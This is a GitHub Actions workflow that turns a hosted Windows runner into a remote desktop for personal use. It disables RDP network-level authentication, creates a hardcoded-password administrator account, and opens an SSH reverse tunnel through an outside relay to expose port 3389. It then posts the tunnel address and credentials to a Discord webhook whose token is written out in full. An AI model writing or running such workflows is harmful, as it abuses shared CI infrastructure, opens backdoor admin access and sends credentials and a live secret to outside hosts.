name: Windows RDP

on:
  workflow_dispatch:

jobs:
  rdp-1:
    runs-on: windows-latest
    timeout-minutes: 100000
    steps:
      - name: FULL SETUP
        shell: pwsh
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0
          $pass = ConvertTo-SecureString "Venom123!" -AsPlainText -Force
          New-LocalUser -Name "rdpuser" -Password $pass -PasswordNeverExpires -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Administrators" -Member "rdpuser" -ErrorAction SilentlyContinue
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "rdpuser" -ErrorAction SilentlyContinue
          Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
          $tj = Start-Job -ScriptBlock { & ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:3389 tcp@a.pinggy.io 2>&1 }
          Start-Sleep -Seconds 25
          $out = Receive-Job -Job $tj -Keep | Out-String
          $match = [regex]::Match($out, 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+')
          $clean = $match.Value -replace 'tcp://',''
          $body = '{"content":"RDP: ' + $clean + '\nUser: rdpuser\nPass: Venom123!"}'
          Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1461013177658769602/mjg15yU9egXIhpHMvomG2Brb5ASM8WJ8ca0CE-Foi_HHpTXox_LfTsYOLH-bv1xgzSKc" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
          Start-Sleep -Seconds 3000

